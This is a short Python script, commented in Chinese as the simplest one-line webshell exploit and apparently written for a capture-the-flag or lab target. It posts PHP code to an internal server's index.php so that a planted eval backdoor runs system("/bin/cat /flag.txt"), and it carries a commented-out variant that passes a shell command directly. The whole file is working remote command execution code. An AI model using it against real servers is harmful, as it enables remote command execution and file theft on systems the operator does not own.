# -*- coding: utf-8 -*-
import requests
# 最简单的一句话木马利用

url = 'http://10.188.14.101:80/index.php'
# eval
data = {'hb': 'system("/bin/cat /flag.txt");'}

# system
#data = {'cmd': '/bin/cat /flag.txt'}

try:
    r = requests.post(url,data)
    print(r.status_code)
    print(r.text)
except:
    pass

